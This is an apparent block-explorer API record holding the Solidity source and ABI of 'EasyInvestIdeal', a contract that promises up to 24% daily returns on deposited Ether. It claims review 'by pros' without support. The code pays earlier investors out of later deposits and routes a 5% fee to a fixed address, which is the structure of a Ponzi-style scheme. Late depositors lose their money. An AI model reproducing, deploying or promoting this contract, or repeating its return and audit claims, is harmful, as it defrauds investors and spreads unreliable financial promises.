{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.25;\r\n\r\n/**\r\n *\r\n * Easy Investment Ideal Contract\r\n *  - GAIN UP TO 24% PER 24 HOURS (every 5900 blocks)\r\n *\r\n * How to use:\r\n *  1. Send any amount of Ether to make an investment\r\n *  2a. Claim your profit by sending 0 Ether transaction (every day, every\r\n *      week, I don't care unless you're spending too much on GAS)\r\n *  OR\r\n *  2b. Send more Ether to reinvest AND get your profit at the same time\r\n * \r\n * Rules:\r\n *  1. You cannot withdraw more than 90% of fund\r\n *  2. Funds from the fund cannot be withdrawn within a week after the\r\n *     launch of the contract\r\n *  3. Those who join the project with a deposit of at least 0.1 Etner\r\n *     during the first week after launch become premium users and\r\n *     receive a percentage of one and a half times more\r\n *     (maximum - 24% instead of 16%)\r\n *  4. If you invest or reinvest not less than 1 Ether, your percentage\r\n *     immediately rises to the maximum\r\n *  5. With each reinvestment of less than 1 Ether (or just when\r\n *     withdrawing funds), the percentage decreases by 1%\r\n *  6. Minimum percentage - 2%\r\n *\r\n * RECOMMENDED GAS LIMIT: 200000\r\n * RECOMMENDED GAS PRICE: https://ethgasstation.info/\r\n * \r\n * Fee for advertising expenses - 5%\r\n *\r\n * Contract reviewed and approved by pros!\r\n *\r\n */\r\ncontract EasyInvestIdeal {\r\n    // records the block number in which the contract was created\r\n    uint public createdAtBlock;\r\n    // records funds in the fund\r\n    uint public raised;\r\n    \r\n    // records amounts invested\r\n    mapping (address => uint) public invested;\r\n    // records blocks at which investments were made\r\n    mapping (address => uint) public atBlock;\r\n    // records individual percentages\r\n    mapping (address => uint) public percentages;\r\n    // records premium users\r\n    mapping (address => bool) public premium;\r\n\r\n    constructor () public {\r\n        createdAtBlock = block.number;\r\n    }\r\n    \r\n    function isFirstWeek() internal view returns (bool) {\r\n        return block.number < createdAtBlock + 5900 * 7;\r\n    }\r\n\r\n    // this function called every time anyone sends a transaction to this contract\r\n    function () external payable {\r\n        // if sender (aka YOU) is invested more than 0 ether\r\n        if (!isFirstWeek() && invested[msg.sender] != 0) {\r\n            // calculate profit amount as such:\r\n            // amount = (amount invested) * (individual percentage) * (blocks since last transaction) / 5900\r\n            // 5900 is an average block count per day produced by Ethereum blockchain\r\n            uint amount = invested[msg.sender] * percentages[msg.sender] / 100 * (block.number - atBlock[msg.sender]) / 5900;\r\n\r\n            if (premium[msg.sender]) {\r\n                amount = amount * 3 / 2;\r\n            }\r\n            uint max = raised * 9 / 10;\r\n            if (amount > max) {\r\n                amount = max;\r\n            }\r\n\r\n            // send calculated amount of ether directly to sender (aka YOU)\r\n            msg.sender.transfer(amount);\r\n            raised -= amount;\r\n        }\r\n        \r\n        // set individual percentage\r\n        if (msg.value >= 1 ether) {\r\n            percentages[msg.sender] = 16;\r\n        } else if (percentages[msg.sender] > 2) {\r\n            if (!isFirstWeek()) {\r\n                percentages[msg.sender]--;\r\n            }\r\n        } else {\r\n            percentages[msg.sender] = 2;\r\n        }\r\n\r\n        // record block number and invested amount (msg.value) of this transaction\r\n        if (!isFirstWeek() || atBlock[msg.sender] == 0) {\r\n            atBlock[msg.sender] = block.number;\r\n        }\r\n        invested[msg.sender] += msg.value;\r\n        \r\n        if (msg.value > 0) {\r\n            // set premium user\r\n            if (isFirstWeek() && msg.value >= 100 finney) {\r\n                premium[msg.sender] = true;\r\n            }\r\n            // calculate fee (5%)\r\n            uint fee = msg.value / 20;\r\n            address(0x107C80190872022f39593D6BCe069687C78C7A7C).transfer(fee);\r\n            raised += msg.value - fee;\r\n        }\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"createdAtBlock\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"invested\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"atBlock\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"percentages\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"premium\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"raised\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"EasyInvestIdeal","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://f743ca163d7b9df5cb0e726f996f770949251f7af42b7a7f79edec35ce91f895"}]}